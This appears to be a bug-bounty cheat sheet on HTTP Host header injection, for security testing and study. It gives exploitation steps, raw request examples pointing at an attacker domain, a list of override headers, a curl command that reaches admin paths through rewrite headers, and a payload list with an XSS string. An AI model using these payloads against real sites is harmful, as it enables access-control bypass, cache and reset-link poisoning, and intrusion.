## Overview
HTTP Host header attacks exploit vulnerable websites that handle the value of the Host header in an unsafe way. If the server implicitly trusts the Host header, and fails to validate or escape it properly, an attacker may be able to use this input to inject harmful payloads that manipulate server-side behavior. Attacks that involve injecting a payload directly into the Host header are often known as "Host header injection" attacks.

![Summary Image](https://pbs.twimg.com/media/ET39wJOWoAAfTBb?format=jpg&name=small)

## Where to Find
- In features where the website sends email, such as forgot password or newsletter.

## Exploitation Methods
### 1. Change the Host Header
Modify the Host header to point to an attacker-controlled domain.

**Steps:**
- Intercept the request.
- Change `Host` to `evil-website.com`.
- Check if the response or server behavior reflects the injected host (e.g., in links or emails).

**Example:**
```
GET /index.php HTTP/1.1
Host: evil-website.com
...
```

### 2. Duplicate the Host Header
Add multiple Host headers to confuse the server.

**Steps:**
- Add a second `Host` header.
- Test which one the server prioritizes.
- Look for inconsistencies in backend processing.

**Example:**
```
GET /index.php HTTP/1.1
Host: vulnerable-website.com
Host: evil-website.com
...
```

### 3. Add Line Wrapping
Use indentation to inject a new Host header.

**Steps:**
- Prefix the second Host with a space.
- Send the request and observe if the server parses it as a valid header.

**Example:**
```
GET /index.php HTTP/1.1
 Host: vulnerable-website.com
Host: evil-website.com
...
```

### 4. Use Host Override Headers
Inject via alternative headers that may override the Host.

**Steps:**
- Add headers like `X-Forwarded-Host`.
- Test in combination with the original Host.
- Verify if the server trusts these over the standard Host.

**Additional Headers to Try:**
- `X-Original-Url:`
- `X-Forwarded-Server:`
- `X-Host:`
- `X-Forwarded-Host:`
- `X-Rewrite-Url:`
- `X-Forwarded-For:`
- `X-Client-IP:`
- `X-Remote-IP:`
- `X-Remote-Addr:`

**Example (Using X-Forwarded-For):**
```
GET /index.php HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-For: evil-website.com
...
```

### 5. Supply an Absolute URL
Use a full URL in the request line with a mismatched Host.

**Steps:**
- Change the GET line to include the full URL.
- Set Host to the injected value.
- Check for host mismatches leading to redirects or injections.

**Example:**
```
GET https://vulnerable-website.com/ HTTP/1.1
Host: evil-website.com
...
```

### 6. Subdomain Injection
Append or prepend malicious subdomains.

**Steps:**
- Set `Host: redacted.com.evil.com` or `Host: evil.com/redacted.com`.
- Test for domain validation bypasses.
- Check if it poisons caches or redirects.

### 7. Path Injection in Host
Inject paths or queries into the Host.

**Steps:**
- Try `Host: example.com?.mavenlink.com`.
- Send and observe URL parsing errors or injections.

### 8. XSS via Host Header
Inject JavaScript payloads for potential XSS.

**Steps:**
- Set `Host: javascript:alert(1);`.
- Look for execution in debugging modes or reflected outputs.

### 9. AEM-Specific Cache Poisoning
Target AEM instances with `/api.json`.

**Steps:**
- Use `Host: , X-Forwarded-Server , X-Forwarded-Host:`.
- Or try full request: `https://localhost/api.json HTTP/1.1`.
- Check for poisoned responses.

### 10. Bypass Restrictions with Rewrite Headers
Access forbidden paths via rewrite headers.

**Steps:**
- Use `X-Rewrite-Url` or `X-Original-Url` to point to restricted areas like `/admin/login`.
- Combine with curl: `curl -i -s -k -X 'GET' -H 'Host: <site>' -H 'X-rewrite-url: admin/login' 'https://<site>/'`.

## Bypasses
- For front-end restrictions: Use `X-Rewrite-Url` or `X-Original-Url` to access forbidden files/directories.
- Subdomain tricks: `Host: redacted.com.evil.com` or `Host: evil.com/redacted.com` to evade validation.
- Absolute URLs or localhost to bypass proxy checks.
- Duplicate or wrapped headers to exploit parsing differences.

## Payloads
1. `Host: evil-website.com`
2. `Host: vulnerable-website.com` (duplicated)
3. ` Host: evil-website.com` (line wrapped)
4. `X-Forwarded-Host: evil-website.com`
5. `X-Forwarded-For: evil-website.com`
6. `X-Original-Url: /admin`
7. `X-Rewrite-Url: /forbidden`
8. `Host: redacted.com.evil.com`
9. `Host: evil.com/redacted.com`
10. `Host: javascript:alert(1);`

## Higher Impact
- **Web Cache Poisoning:** In AEM via malformed headers, leading to persistent attacks.
- **SQL Injection via Host:** Bypass host header to inject into database queries (e.g., as seen in reports).
- **XSS:** Payloads like `javascript:alert(1);` triggering in debug modes.
- **Access to Forbidden Areas:** Using rewrite headers to reach admin panels or internal files.

## References
- [PortSwigger](https://portswigger.net/web-security/host-header/exploiting)
- [HackerOne Report 317476](https://hackerone.com/reports/317476)
- [XSS via Host Header](https://blog.bentkowski.info/2015/04/xss-via-host-header-cse.html)
- [Host Header to SQLi](https://blog.usejournal.com/bugbounty-database-hacked-of-indias-popular-sports-company-bypassing-host-header-to-sql-7b9af997c610)